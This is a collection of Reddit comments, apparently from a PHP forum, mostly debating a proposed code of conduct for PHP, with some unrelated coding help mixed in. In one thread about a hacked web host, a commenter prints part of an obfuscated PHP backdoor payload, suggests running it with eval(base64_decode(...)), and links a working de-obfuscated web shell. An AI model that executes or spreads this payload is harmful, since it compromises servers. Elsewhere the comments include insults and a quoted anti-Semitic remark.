Quite possibly. Some people are employed directly or indirectly to work on open source software, and others work for institutions that are involved in open source software. It's not just a question of kicking assholes off the mailing list of some volunteer project. For some people, an open-source software "code of conduct" could affect their employment and employability. That's why it's a somewhat more serious step for a language to adopt an official "code of conduct" than one might initially think. I found his citations of the Geek Feminism CoC to be pretty damning, although I went and read it on the original page to make sure I wasn't missing anything. (I found it easier to take a charitable view of what they might have *intended* when read in context, but the substance and ultimate power of their words was as reported. There was no moderation of any absolutes cited, for instance.) What I liked especially about reading this document was that, although I agreed with him about the problems he found with CoCs, and disagreed with him about many of his own assumptions about the world and how things work or should work, it seemed to me that this was someone with somewhat disagreeable views who was driven to write out of genuine distress and fear, rather than someone who was somewhat distressed and frightened driven to write out of genuinely disagreeable views. **edited to add:** Which is, to my subjective experience, *rare*. It occurred to me later that this might be unclear.
As was possibly the person who fired them? My memory is hazy, but afterward everyone seemed to agree that there was no way that they should have been fired. (Incidentally, the woman who was responsible shouldn't be held directly responsible for that, although her behaviour was identified as part of definite and arguably malicious pattern.)
Pretty sure it was a guys repo, not a lady. This incident is also linked in the article, just search for Adria. I'm pretty sure she lost her job as well.
None of this began nor ends with Tumblr. In its various forms it's a fight that has existed for more than a century. Nothing about it is new. People are simply paying slightly more attention to some aspects of it these days. Tumblr is only a figurehead because it's the first place some people on the Internet have been exposed to some of these ideas.
Got the answer from LawnGnome on ##php. "self" can be used in this case. protected function setTraitValue(string $value): self { $this-&gt;traitValue = $value; return $this; }
The Contributor Covenant does some problematic things: For example, it says that gender, race, age are protected categories – but other things are not. Solution: Write this the opposite way around. Another issue: It specifies that offending things should be banned, without specifying them – another subjective thing. Another issue: It argues that reverse racism doesn’t exist, while using a very limited specification of racism (only institutional racism counts, but direct discrimination doesn’t – and reverse discrimination does exist) It is very subjective, problematically. As I said, read the PostgreSQL CoC, that one looks a lot better.
&gt; The types that are shouting it down have no desire to improve the CoC proposal, because they are ideologically opposed to one existing. There is no point in engaging them. I am sympathetic to this view. I took part in the discussion on _Meta Stack Overflow_ when there was an uproar over Stack Overflow wanting to sponsor some (very small) women-only tech programs. This tech employer was wanting to redress, even a tiny bit, the inequality of opportunity in their industry - and to advertise that minority groups are welcome there. Of the people who were the most vocal in opposition, I felt that at least some of them were in favour - consciously or otherwise - of maintaining the system of privilege that had elevated them. &gt; Imagine the type of actions that would need to be undertaken for php-internals, the toxic kindergarten of scum and villainy Ha ha, I can `:-)` 
&gt; For example, it says that gender, race, age are protected categories – but other things are not. Solution: Write this the opposite way around. It does have quite a long list, but yes, it's not exhaustive. However, it doesn't actually make those protected categories as such, it just says that none of those things should matter and everyone should be able to participate without harassment. So it's just there to reassure people who are worried they would be discriminated against for those reasons. &gt; Another issue: It specifies that offending things should be banned, without specifying them – another subjective thing. This is quite broad, yes. It gives whoever enforces it a degree of discretion. It doesn't specifically say offensive things are bad and prohibited, but rather that if the maintainers deem something sufficiently so they can take action. Still, I can understand that concern. &gt; Another issue: It argues that reverse racism doesn’t exist, while using a very limited specification of racism Huh? Are we talking about the same document? I don't see any mention of racism, reverse racism, or anything to that effect. You may be confusing the Contributor Covenant with a different code of conduct that was proposed for another project.
http://i.imgur.com/lZvPSyB.jpg He wore it to a press conference. It's not like they were out for beers on Friday night. It's one thing to dress a certain way during your free time, but it's another to wear it when you're representing an international scientific agency. I don't think he should have been fired for it, but the fact that no one within the agency saw a problem with a shirt that clearly many of his peers outside of the agency had a problem with is what was really being complained about. He shouldn't have been fired, because someone should have told him "Hey, before you speak internationally about this magnificent scientific achievement you took part in, maybe change into a shirt with women who are wearing at least as much clothes as you are. Or maybe a shirt with no women on it. That might be more professional."
&gt; But I do think that the fact that it's done subconsciously is significant. Is it done subconsciously? Or is it merely people following convention? Certainly, if you read a book or take a class that tells you that "hey guys" is somehow oppressive, and you believe it, then when it happens to you you're going to feel oppressed, either consciously or subconsciously. But that's kind of on you, and perhaps the person who put that idea in your head, not society. Look, nobody is saying that there aren't prejudiced people or prejudiced institutions. You're always going to have that unfortunately, as long as human nature is what it is. But there are a lot of places where these prejudices are perhaps less prevalent than what certain ideologues would have you believe. I firmly believe FOSS culture is one of these places, ergo this recent SJ CoC initiative probably feels insulting and unnecessary to a lot of people.
Really interesting post, thanks for finding this comment a week late, just to misunderstand that OP was looking for the defacto package manager and unit testing software and could have _very easily_ done so with Google or any other leading Web search engine. Now fuck off.
Regarding the last thing: The latest versions of it don’t have that part anymore, but predecessors, which were also adopted by GitHub, etc, do have that part still.
&gt; I am often surprised how much opposition there is to codes of conduct generally. From my perspective because of how targeted they are, if the coc was similar to debian's https://www.debian.org/code_of_conduct I doubt there would be any debate or problems, but it was very specific to one group's speech and belief being acceptable and others not. The other reason is because this is a solution looking for a problem, I haven't seen any specific example of a situation that this was needed... And as demonstrated in other projects, people will attempt to use a COC to get people removed for making statements disagree with completely outside of the community. https://github.com/opal/opal/issues/941 
I mostly agree. Like one could disagree, you're merely expanding parent comment with facts. I just had to react about this: &gt; [Shirt guy] btw, agreed and apologized. Well... he apologized. Agreed? He probably said he did as part of the apology. He possibly could have feared for his job if he didn't "agree". Who knows. Bringing up the fact he agreed as a contradictory point of view is a bit one-sided from the other side ;) (SJW disclaimer: I don't have a side. Please leave me, my job and my kids' custody alone) Shirt guy's the one I feel the most for. Probably not aware of WhateverGate before it happened to him, likely a worse sense of fashion than mine (and that's saying something), possibly wasn't even aware it was lander day and he'd make TV when he dressed up that morning. Oh, and the gift-from-a-lady irony. Have an upvote, 0's not enough for a sensible comment. There seem to be people out there looking for blood, yet the fact they could be a minority doesn't diminish the threat. Why am I even subscribed here, I don't code in PHP anymore.
This sub has really shown its true colors since these posts started cropping up. As usual, many good arguments are downvoted, and the hive mind posts about scary essjaydoubleyews go straight to the top. I guess it was too much to hope that this sub somehow skewed towards better understanding and away from the rest of Reddit but it an article like this is popular that clearly isn't the case. 
&gt; Two people can't make a joke to each other unless its behind closed doors. If you're going to make sexual jokes at a professional conference, that would be best. &gt; You really want to open this up to the right wingers who get all in a huff over two gay guys holding hands or shock! kissing in public? If two gay guys are going to make out at a developer conference, I hope they too would get kicked out. A lecture on application security is no time to make out with someone.
Here's my take: You have three factions. One consists of Feminists who just hate men in general and will do anything to hurt them (lets call them "Feminazis"). Another just consists of Mysinogists (pretty self explanatory). And finally we have the sane group who are mixed with both women and men who seek to solve the problems the first two factions are always creating (we'll call them "Humanists"). From what I've seen on every past issue, especially gamergate, we've had one person (usually of the female gender) out of the Humanist group come out and say that there is an issue that need to be addressed. Then suddenly the Mysinogists cry "Feminists!" and begin their campaign of harassment and hatred. Following that the Feminazis decide to stir the pot a little bit just to make themselves look superior. This usually involves harassment against male Humanists and sockpuppets (fake people) attacking the female. Sometimes a Feminazi shoots their mouth off and Humanists try (in vain) to prove them wrong. But of course the two groups responsible for the mudslinging get at it again and the cycle repeats itself. It's a very messed-up view of what we do have today. To me this is the truth of things.
I see, so you just hate fun. Anyone that might enjoy themselves or be quirky in any way has got to go. I feel sorry for you. You must live in a very dark place. Why would you want to force the rest of us to be as boring, uptight, and miserable as you are?
Yes, that's exactly it. Great job, Columbo.
You are implying that good arguments only come from one side, which is not the case. Your response adds nothing to the discussion but more accusations and emotional rhetoric. 
Oh, certainly I understand all of that. Tim Hunt is the only one I don't really feel very sympathetic for just because it seems like he made his own bed and then shat in it. Like I said, I don't think *anyone* holds up donglegate as an example of a good way of handling these kinds of issues. Even the most radical feminist activists I know would agree that had a bad outcome all around. And I *do* feel sympathetic to shirt guy, too. I totally understand why it upset people, but it's also pretty clear he meant no harm. I think it's a very unfortunate situation: the shirt was a ironic gift and I'm sure he thought it would just be a fun way to celebrate. And that could've been fine as just a fun inside-the-lab joke but then he wore it to this huge, public announcement and there's just no way the public could've known the context behind it. What I meant is that he gave a sincere and heartfelt apology. He made it clear that he understood what had upset people and that he was sorry for it. I'm sure the public pressure played a role. How could it not? But I don't think it was a fake apology. I wish the situation could've unfolded more amicably, but the nature of social media is that everyone can comment on everything in real-time. Some of those comments are going to be mean and nasty and I'm not sure what do about that. And every one of these situations always has assholes on both sides making everything worse. But I am glad that this situation ended relatively positively. I think if we can look past the loudest, angriest voices, often we find that people just want to be listened to and respected. And just maybe we can mostly agree not to be total assholes to each other.
Why does it need to be written down? If someone is a dick, tell them, move on. Like.. Everything else in life... (BTW I agree with you)
No, no, if I was Colombo, I would say: (in Peter Falk voice) *"Just one more question, when you go into the deep, dark place of your mind, is it really filled with spite, or is it just the sight of other people enjoying themselves that gets you upset?"*
Actually that's not what I implied or said, but I did say good arguments that go against the general opinion of Reddit and this sub are often downvoted in these threads. I am not aiming to contribute to this actual discussion, since discussion is being shouted down as much as possible. Rather I am pointing out the embarrassing reaction from this sub. Edit: I guess the downvotes on my comments and the upvotes for the on-message misinformation in yours is a convenient way to showcase my point.
It is an issue when they try to get you fired for innocuous stuff, like that dude who made a dongle joke to his mate.
The worst part is the whole "reverse racism/sexism/etc doesn't exist" thing. Sure, white/male privilege is a thing (in the Western world at least), we can all agree on that, but giving people a blank check to bully those groups isn't going to help anyone.
absolutely true. 
Who is fondling who? What the fuck?
And why do you think a code of conduct is going to stop someone who already can't stop themselves? Edit: As expected, parent deleted.
The problem with that is that people have different definitions of "be nice". To some people, expressing concern is nice and to others keeping to yourself is. To some people, white lies are nice and to others the truth is. To some, being nice is being casual and to others it is being formal/polite. The main irony of CoCs is that they are generally claiming to be there to help diversity, but in doing so, they often pretend that there is no diversity in morality, notions of socially acceptable practices, etc. when there is substantial evidence that these things vary a ton based on culture, geographic region, age, religion, etc.
I think nobody would disagree with a CoC that focused primarily on things like "no fondling". The issue is that they often include vague subjective language making it unclear what exactly is covered and often making it so that depending on the perception/reaction of the victim may cover seemingly normal actions unbeknownst to the accused.
&gt;You guys are the reason we need CoC's. Putting the responsibility on me, or anyone else who has dealt with this sort of thing, to go to the police and resolve the issue independently is why we have CoC's. Read some statistics on how often sexual assault victims are able to prosecute. Well ok. I mean, innocent until proven guilty is still a thing right? Or are we blindly assuming everyone is guilty by association? 
Not asking to throw anyone in jail here. I am sharing my personal experience here, with the hope that a "Don't touch other members" or equivalent might make the CoC. Why are you getting so defensive? 
Why? Cause its the internet. I dont believe half the things I read. Im defensive now cause you had a shit reaction to being asked about an experience. I asked for something to back up your story. Like /u/fleshintogear says, people will use vague accusations to bolster an argument. And with your response to /u/jtreminio, "You guys are the reason we need CoC's", is just flat wrong. Im not the reason you need anything. I know how to behave, I know how to hold myself in public without sexually assaulting someone. I know how to grab a beer with coworkers, and have fun. This kind of stuff can legitimately ruin people's lives when accused of something. With sexual assault, its even harder to have a fair hearing. I'm not saying I think you are lying, and Im sure it was a harrowing experience, for this CoC, its just as dangerous as saying something slighting a minority group. Im for common sense. If you were sexually assaulted, advocate for something more then a CoC. But dont just blindly assume people who are against the CoC are sexually assaulting assholes. 
Why are you getting defensive? That's what I asked. Cause the internet makes no sense. You type real fast though. I'll give you that! :) 
thanks, if you knew how many typos I had to fix, it may not be as impressive. My code and comments are even worse sometimes :)
Bhahahaha. #trolled
&gt; You guys are the reason we need CoC's. Curious what you mean by this. &gt; Putting the responsibility on me ... to go to the police and resolve the issue independently Yes, that's what people do when a crime is committed against them - they call 911 and get the police to help them resolve the situation. This is like universities trying to resolve campus rape by treating it as a student misbehavior issue rather than a criminal issue and referring the case to the police. If I'm at a conference and someone assaults me - full on beats me to a pulp - do you think I would take the matter to the conference organizers, or contact the police to come and handle the situation? Your horrible experience deserves the same reaction.
Donglegate is basically an example of what can happen in a worst case scenario, but it's exactly the scenario that this RFC brings to mind. These guys were fired for making a common joke that happened to be overheard by someone who took offense to it and managed to (initially) get them fired over it. All because she didn't know what dongles and repositories were, even though she was a 'tech journalist'. Yes, the backlash against her was extreme at times. But the same fear and anger that drove that backlash is what's driving the response we're talking about.
TIL holding hands is making out.
Sorry, just rage quit the PHP community. Good luck with your ethics! :) 
That was so well written, it's a shame we don't know who wrote it.
Great job staying on topic. 
&gt; We're discussing how the PHP community will define "nice". I was just criticizing the particular example of being short and vague. We're programmers and should be experts at writing unambiguous, precise and complete sets of instructions. Using that ability, we should make a CoC that has one interpretation that is clear to all. &gt; If ~66% of the community agree with a certain way of behaving, then the community as a whole can endorse it. But, what does it mean if 34% of people don't endorse it? What does that say about your respect for their values? The reason the bill of rights exists in the United States is because there are many times that 66% of people would have voted to restrict other people's rights in favor of their personal opinions (re: religion, speech, etc.). Unpopular opinions are the ones that need protection. Popular opinions automatically have protection by err... being popular. &gt; What should we do instead? Death match? That's not fair to me, or other scrawny people. :( Well the real controversy is that a universal code of conduct means (1) everybody has to treat everybody the same even though everybody is not the same and often (2) that we're supposed to avoid an undefined action (i.e. avoid offending or causing discomfort to a person without knowing what makes that person uncomfortable). I'm not as familiar with how the PHP community works, but what if rather than everybody standing behind ONE code of how everybody should treat and be treated, what if each person said "this is the code that represents how *I, personally,* want to be treated". So, maybe there end up being 2 codes or 4 codes. The solves the problems that (1) there are a diversity of ways people want to be treated and (2) we can't treat somebody nice until we know what they personally think nice is by facilitating communication about how people want to be treated. Then, the "universal" code of conduct is simply "treat the person in accordance with the code expectations they have". The main logistical challenge would be conveying which code you were a part of (email signatures, profiles badges, etc.) but it's worth it because it doesn't marginalize tons of people in the way that 66% vote would.
I'm responding in direct response to this original comment thread. In that example, the vote would be at about that percentage. Not a mathematician and I don't claim to be. I was paraphrasing the original comment to make sure I understood it correctly. 
Running Wordpress by any chance?
Not a downvoter here, but (and I've had the temptation myself in seeing some project announcements) it's not really necessary to advise someone building an open source solution that the solution exists elsewhere - nature will take its course for open source projects which can't compete and the potential cost of discouraging someone from contributing code others can freely use is a net negative for all involved.
He's saying you're likely bullshitting with the above remark and trying to be an instigator. Your snide offhand attacks prove to me that COC die hards don't think the rules apply to them, only to everyone else. I guess we're the 34%.
I'll let my shrink know what fleshintogear from the Internet had to say. Thanks for the feedback. :) 
Spammers love poorly-configured webhosts because they can gain access to hundreds or even thousands of domains to abuse for sending spam. Your host is doing a poor job of protecting your domain's reputation (no offense intended if you're responsible for configuration, but this just smacks of inexperience). Tell them to disable [mod_userdir](https://httpd.apache.org/docs/2.2/mod/mod_userdir.html). Follow-up steps: * Whichever user is running an outdated version of WordPress needs to be deactivated or "persuaded" to review [Hardening WordPress](http://codex.wordpress.org/Hardening_WordPress) * Examine the outbound messages to confirm that your domain is not being used (if it is, time to [see if you're blacklisted](http://mxtoolbox.com/blacklists.aspx)) * If you're hosting with a third-party, find a new host - even if they fix this issue, they're so far behind the times security-wise that it's only a matter of time before their incompetence affects your site again
All you're doing is proving us right. Vague statements, offhand comments.
We're switching to another host soon, and the fact that our server sends out SMTP from itself and doesn't use a reputable relay is silly to me. That'll all be fixed within a few days, but I'd love for some folks to pick apart the backdoor itself to see what it does. :)
It's probably utilizing a remote file include to execute r57-shell (typical when initially establishing access to enumerate other user accounts on the system) and your ini.php is most likely a payload file (installed after initial exploit) which relays instructions to send spam. Edit: if you're really dying to know, it boils down to what appears to be some opcache'd code as defined by this string: yVeaFftOfIQ5KfYvaWjjyIIYr6vXyeF1hOJxoS7dTtg47fp4eUSjo0xTcVjcIcac6Bta9INvrdft9O/2aWHXm6kX8JURFSeO+t8PgfQYK7uYyx6S3RD54nwVuoW5rcrvaG/V70bYKJbYKJbYhoiHPskHFuSLVOgwYxJE9PMDBPMDBPMD1zdHJfcmVwbGFjZSgnX19GSUxFX18nLCInIi4kT09PME8wTzAwLiInIiwkR0xPQkFMU1snT09PMDAwME8wJ10oJEdMT0JBTFNbJ09PTzAwMDAwTyddKCRHTE9CQUxTWydPME8wME9PMDAnXSgkTzAwME8wTzAwLCRPTzAwTzAwMDApLCc1aHE0QW53ckZCRGcraWRlNmNOVXhKcGJNZldQVlIwbEhDN1R1SUdza0svMn You can run: eval(base64_decode('yVeaFftOfIQ5KfYvaWjjyI'. 'IYr6vXyeF1hOJxoS7dTtg47fp4eUSjo0xTcVjcIcac6B'. 'ta9INvrdft9O/2aWHXm6kX8JURFSeO+t8PgfQYK7u'. 'Yyx6S3RD54nwVuoW5rcrvaG/V70bYKJbYKJbYhoiH'. 'PskHFuSLVOgwYxJE9PMDBPMDBPMD1zdHJfcmV'. 'wbGFjZSgnX19GSUxFX18nLCInIi4kT09PME8wTzA'. 'wLiInIiwkR0xPQkFMU1snT09PMDAwME8wJ10oJEd'. 'MT0JBTFNbJ09PTzAwMDAwTyddKCRHTE9CQUxT'. 'WydPME8wME9PMDAnXSgkTzAwME8wTzAwLCRP'. 'TzAwTzAwMDApLCc1aHE0QW53ckZCRGcraWRlNm'. 'NOVXhKcGJNZldQVlIwbEhDN1R1SUdza0svMn')) ... at your own risk :)
*backrub*
[**@adriarichards**](https://twitter.com/adriarichards/) &gt; [2013-03-14 18:12 UTC](https://twitter.com/adriarichards/status/312265091791847425) &gt; @skwashd you should put something in your pants next time...like a bunch of socks inside one...large...sock. TSA agent faint ---- ^This ^message ^was ^created ^by ^a ^bot [^[Contact ^creator]](http://np.reddit.com/message/compose/?to=jasie3k&amp;amp;subject=TweetsInCommentsBot)[^[Source ^code]](https://github.com/janpetryk/reddit-bot) 
UPDATE! After cleaning up the de-obfuscated code and getting it working, I ran it on a local PHP server after removing any code that might call home. It's a fascinating little script, and it's probably THE worst code I've ever seen written. Scrolling marquee at the bottom: "يرجى منكم اخواني عدم اختراق المواقع العربة اخوكم انور- *anwaraze* - maroc cafe dar badi3a max - 747crew" Screenshot: http://imgur.com/USfdVQy It has loads of administrative commands to poke around and get info on the system. I've uploaded the working version here: https://gist.github.com/deftx/c2cdc998e6b257979fff Use at your own risk :). It's a fascinating little tool.
Your users aren't jailed then.. if you login as a user you can edit any other user accounts files.. you should change that. Look up chroot and mod_userdir
Again, there's no mommy for the internet, and any creation of it has lead to good people losing their jobs and careers over petty nonesense and subjective content that is up to the wims of any group of people. If you want a CoC, deal with the fact that its effectively useless and is only a gesture of good will. It does not have any authority to do anything and a want for a mommy authority on the internet would destroy its anonymous foundation, making for more discrimination, not less. We can all agree on a gesture of good will, as long as that gesture doesn't have an agenda, and can be reasonably agreed upon and is not a requirement.
Apologies
Since PHP cannot execute javascript (unless you install that v8 extension http://php.net/manual/en/class.v8js.php), so I highly doubt it.
[**@CoralineAda**](https://twitter.com/CoralineAda/) &gt; [2016-01-22 00:44 UTC](https://twitter.com/CoralineAda/status/690334282607378432) &gt; Thoughts on leaving technical mgmt of Ruby to Matz and delegating community mgmt to a separate org? ---- ^This ^message ^was ^created ^by ^a ^bot [^[Contact ^creator]](http://np.reddit.com/message/compose/?to=jasie3k&amp;amp;subject=TweetsInCommentsBot)[^[Source ^code]](https://github.com/janpetryk/reddit-bot) 
Don't these walls of text kinda prove this is a problem
First, a disclaimer: I'm heavily involved with LGBT community and have, for example, lectured professionals on this matter. Naturally, my views are heavily biased towards the welfare of LGBT individuals. &gt; when my intent was, and is never to upset anyone To quote a friend of mine, "intent is not magic". Of course, everyone makes mistakes, a lot of them, but the problem usually arises when people don't own up and learn from their mistakes. A classic and common example can be taken from the trans people who are often misgendered. Now, it's natural that we make quick assessments about other people's genders and sometimes they are not right on the mark. If you misgender someone and are informed about it, just say you're sorry and use the preferred pronouns from then on. Everyone moves on with their lives. That's, however, sadly not how it usually goes. The moment you continue using pronouns that are not preferred, even though you've been informed about it, and insist that it is your right, is when you move from the "good intent" territory to the "asshat" territory. Most of the time, this is exactly how these arguments go. This is just one example, but many minorities have similar experiences. My personal experience is that CoCs do not exist because of well intended mistakes. They exist because there is considerably high amount of people that insist on not accommodating different kinds of people. &gt; I should be allowed to openly hate the idea of people being gay I don't think this is a very good example, and it certainly doesn't compare well to atheism. Just because someone is an atheist, doesn't mean they openly hate religion. For example, I would not be considered a religious person by almost any standards, but I do not have any hard feelings against religious people. In fact, I think it's something that can benefit quite a lot of people. Sometimes I wish I was more religious, but that's just not how my mind works. However, openly hating people because of their race, gender, sexual orientation or religion is a bit different. Generally, people who openly hate based on these attributes tend not to be the most pleasant people. It's also hard to say that if you openly hate someone because of these attributes, that it does not affect your judgement of their work. &gt; I don’t want to be the subject of a witch-hunt I feel like there's a lot of scaremongering about the subject of witch hunts (which, I generally do not condone). Personally, I've never really seen this happen in LGBT communities. Sometimes some measures have been taken against specific individuals, but this has really been because these people had the agenda of destroying the lives of LGBT people and it truly was for the concern of safety of these people. It has never been because someone said something well intended but wrong, only because of systematic harassment. In my experience, even in cases where the harassment has crossed the border to being criminal, police just turn blind eye (even in the most progressive countries), because there are minorities involved. &gt; I am careful about everything I say and write online Now, I'd like to highlight that I personally feel that it is highly regrettable, that people are afraid to say something because of being afraid offending someone. It does not benefit the discussion at large and robs people of chance to learn. Though, if your opinion is, for example, that all gays should be burned at stake, then perhaps it is time to reconsider your values and not be surprised if someone takes that badly. Just be ready to accept the fact that everyone makes mistakes and having to own up to your mistakes doesn't make you a bad person. Just understand, that if some individuals are reluctant to explain the whole context to you in all it's glory, it's because minorities tend to face these "requests" to educate others sometimes on daily basis. No one has that kind patience.
Excuse me, who are you to say who does or does not belong to a community of coders? I thought code was all that mattered, but you do read like you have an agenda of your own, with a pre-existing view of who gets to contribute and who doesn't based on political views. 
Greetings. Nice to hear good thoughts from fellow countryman :)
Uhh this is sooo ugly: 'class' =&gt; 'App\\MyImageInfoClass' and $info-&gt;getProvider('oembed');, and thousands of other things. But other than that nice library but not really extendable or modular - so I won't use it. I dont want to get in conflict with my inner peace :) 
Check your dom logs for post commands. You should be able to track the offending exploit. Wordpress, drupal and magento have all had critical exploits. You have to find the entrance vector and fix it or theyll just re exploit you.
No. No they don't. I'm sorry you feel that way, but one man pontificating doesn't prove or disprove anything, and disagreement is not abuse.
i was just thinking of the idea that if i accuse you of fucking a pig and all you can do is extensively say you did not fuck that pig then ... you may or may not have fucked that pig but it is now part of the conversation
Oh, not here. On the PHP internals mailing list where all the discussion was happening. http://news.php.net/php.internals
http://i.imgur.com/vUfjJ53.jpg
And yet that is exactly how it should be in a free society (free as much as possible). One person's interpretation is and almost always will be different than of the others. And these constraints prioritizing one interpretation (here it's the *what-is-dickness*) over those that can other people have will inevitably (and may I say "*by definition*") lead to a less free society. And I'm sure that's what everybody wants, right?
I'm looking forward to all the new possible input the project might be getting from people who were concerned about contributing before a CoC was put in place. Additionally I'm wondering how many contributors are really only contributing under the condition that there is no document asking them not to be assholes. Or conversely, I wonder which contributors will be more healthy for the project as a whole: Those by people unwilling to contribute without a document to promise them safety or those by people unwilling to contribute under the presence of a document telling them not to be assholes. Only time will tell.
fyi: on the site I tested, the og:type wasn't extracted.
At the end of the day, nobody released their names. Richards could have done it, other people in attendance could have done it. Nobody did it. So their reputation is hardly ruined. Most recruiters wouldn't say "wait, I know your face! you're the guy with the bad joke!", but if they knew the name they may not interview them.
Whatever you need to believe to make you feel better about your world view, man. 
I'm trying to use native repos or highly trusted PPAs (oracle - mysql 5.6). Do you have a suggestion that isn't webupd8 -- or even dotdeb? (I trust dotdeb, but...).
This looks amazing...only I don't quite understand. Would I then do this: $category_filter = $category_filter ?: '*'; $brand_filter = $brand_filter ?: '*'; $stmt = mysqli_prepare($db, $sql); mysqli_stmt_bind_param($stmt, "ss", $category_filter, $brand_filter); mysqli_stmt_execute($stmt); mysqli_stmt_bind_result($stmt, ??????); mysqli_stmt_fetch($stmt); mysqli_stmt_close($stmt); How many result variables would I need? Just one? With my current statement I just run mysqli_fetch_assoc on the result and get an array with all the values.
&gt;Once in a while I run into a situation where trying to use a mocking library hurts the readability of my test. Quite the understatement to start off with :)
Spam
What are these "Top" based of? "Magic"? No Aura, no Symfony, no Yii. Hard to take it seriously.
It's nice that you picked such an obvious and non-subjective constraint for this hypothetical CoC you posit; I mean, it's not at all ever been a problem that people disagree on what defines "being an asshole," right?
Here's the PHPUnit configuration file in the proper format. &lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;phpunit backupGlobals="false" backupStaticAttributes="false" bootstrap="vendor/autoload.php" colors="true" convertErrorsToExceptions="true" convertNoticesToExceptions="true" convertWarningsToExceptions="true" processIsolation="false" stopOnFailure="false" syntaxCheck="false" &gt; &lt;filter&gt; &lt;whitelist processUncoveredFilesFromWhitelist="true"&gt; &lt;directory suffix=".php"&gt;./src/&lt;/directory&gt; &lt;exclude&gt; &lt;directory suffix=".php"&gt;./tests/&lt;/directory&gt; &lt;/exclude&gt; &lt;/whitelist&gt; &lt;/filter&gt; &lt;logging&gt; &lt;log type="coverage-text" target="php://stdout" showUncoveredFiles="false"/&gt; &lt;/logging&gt; &lt;testsuites&gt; &lt;testsuite name="Package Test Suite"&gt; &lt;directory suffix=".php"&gt;./tests/&lt;/directory&gt; &lt;/testsuite&gt; &lt;/testsuites&gt; &lt;/phpunit&gt; 
yeah, Pico has ugliest core codebase, plugin api and developed plugins - I have ever see. Your Pico - works slower and use more memory than Fansoro!
Thanks! I like your solution! Simple and no need to implement too much architecture stuff.
I'm happy it's so clear to you. It's *not* clear to me, and to many others. Let's just look at one example from PHP's past: Jani Taskinen. "Project maintainers have the right and responsibility to...ban temporarily or permanently any contributor for other behaviours that they deem inappropriate, threatening, offensive, or harmful." Now, at one point, Jani was one of the most active project maintainers. Due to things that happened outside of PHP, Jani became very anti-Semitic. His semi-infamous last screed said: &gt; &lt;_sniper_&gt; FYI: I don't care at all what anybody thinks about me. I'm going to be openly anti-Israel from now on. This was the last straw for me. Fuck you jews...I will also quit this project. As long as it's backed by some Israel company, I don't want to have anything to do with it. But, according to this CoC, the correct thing for Jani to have done would have been to stay a member of PHP and instead lock out of the code repo anyone that was connected to Israel (which would have included two pretty active and public members of the PHP group.) Or I could point to myself - I have often been persecuted because of my religion; in fact, I'd dare say that most of the members of the PHP development team would probably think I should be banned from the project if they knew my religious convictions, judging me to be guilty of "behaviours that they deem inappropriate, threatening, offensive, or harmful" because of decisions other people who claim to share my religious persuasion have made. Specifically, the Contributor Covenant has regularly been used to threaten and bully people from different political persuasions than its author. So it's not as cut-and-dried as you want to market it to be. This is murky water. Anyone who pretends it's not has either never been persecuted in any way, or they are coming from a stance that I just don't see how they can defend.
Triggered is an insensitive word to minorities and ptsd patients. You should say: My jimmies are rustled
It's been a while since I looked at forums. I think phpBB has gotten better, so maybe take a look at their latest version. They also have a bunch of plugins, one of which I'm sure supports ads.
Sorry, should have been more specific. I meant that I read your post as suggesting that the overwhelming response here was anti-social justice - there are several that are pro-social justice, including some of my own. I agree that where the opposition to a code of conduct is reflexive and based on deeply reactionary principles, that reflects poorly on the community - we should be aware that some people do not _want_ communities to be more welcoming of minority groups. However not all opposition is reflexive, abusive or reactionary - whilst I disagree with the OP, who has nothing to say on how to redress inequality of opportunity - the points about openness and transparency are worth thinking about. 
As has been mentioned, a message queue would be a sound approach. Make an endpoint to start the process, then make another to check up on the status of it. In the background, get something like RabbitMQ to pass messages to a consumer which actually does the processing on the server.
Can this be applied to several databases at once? Thx edit: also for different ip's? 
You could use [Parsedown](http://parsedown.org) to convert the markdown to html :)
If it's hard to detect, you wrote it wrong.
Oh yeah, like that will make a difference /s
&gt; check the state of the processes like every 5s or etc That is probably not great advice. So long as the status check is a trivial thing to check (which it should be) then asking for an updated status straight after getting the previous status should be fine. If you're only checking the status every 5 seconds, then it means that each task will take a few seconds longer to complete. Although it's only going to be saving a few seconds, it's much better to use those CPU cycles to update the page as soon as possible. 
It will depend entirely on your use-case. There are different times when you could prefer one over the other. Most of the time, relative makes more sense in common use-cases though.
What we are missing is a Unit test for humans. public function testDeveloper() { $this-&gt;assertInstanceOf('AbstractDickDeveloper', new AssholeException); }
As much as that is good advice, how is this relevant to OP's question?
The only real solution is a donger fight ( ͡° ͜ʖ ͡°)
How answer "pick XX and be happy" will help person who don't know what he wants? Edit: apologise, i wrote my comment about specking first after reading other comments and author response to them, not as direct answer to topic.
notsureif.jpg
From (now removed) original question it wasn't clear that you were using mysqli which AFAIK do not support named parameters. PDO does. You would have to change named params to ? and provide 6 parameters :( mysqli_stmt_bind_param($stmt, "ssssss", $category_filter, $category_filter, $category_filter, $brand_filter, $brand_filter, $brand_filter); The rest of your code should be as it was before.
But he does know what he wants :D, he wants a recommendation for a PHP authentication library, and there are plenty of them around. It looks like he already has at least some set of requirements from his question, and his comments in this thread have reinforced that point.
Sorry mate, very confused here. I changed this: AND (a.category = '*' OR a.category = ? OR c.parent = ?) AND (a.brand = '*' OR a.brand = ?) But that's only 3 parameters, not six. This code does actually work, but only if both a category and brand filter have been set.
ACF (advanced custom fields) uses get_field heavily, not sure why it's being overwritten here. Looks like unfinished code.
There's a lot of weird people in open source.
So if "everyone is offended" these days is bullshit, why do we really need a COC imposed upon us? &gt; Let’s look at the “master/slave” nonsense The fact that that happened AND wound up being accepted is utter and complete nonsense. Should the storage industry also issue sweeping changes so no one is offended by this decades old labeling? Shit like this should be rejected without question unless it is legitimately offensive, and it isn't. All of this shit just seems like overly sensitive people forcing change for the sake of feeling better about themselves and not much else. Then carry it like they're a champion of oppressed people when really its an ego boost.
I use [Couscous](http://couscous.io/), its a really great and actively developed tool.
an update to what the editor or a plugin? I just installed a plugin for vuejs
Performance anxiety is real and it can affect all of us and talking about this stuff really helps. Onto the topic: I have experienced anxiety from working as a developer at some point, where I would dream about the things I was busy with at work, wake up like a train smash and feeling like not getting enough sleep. This caused me to be fidgety and uneasy day to day. At some point I realized I have a problem and found that doing something unrelated like sports or gaming after work helped immensely. Good luck to everyone that experiences this feeling. Talk about it and work through it. You will come out of it :)
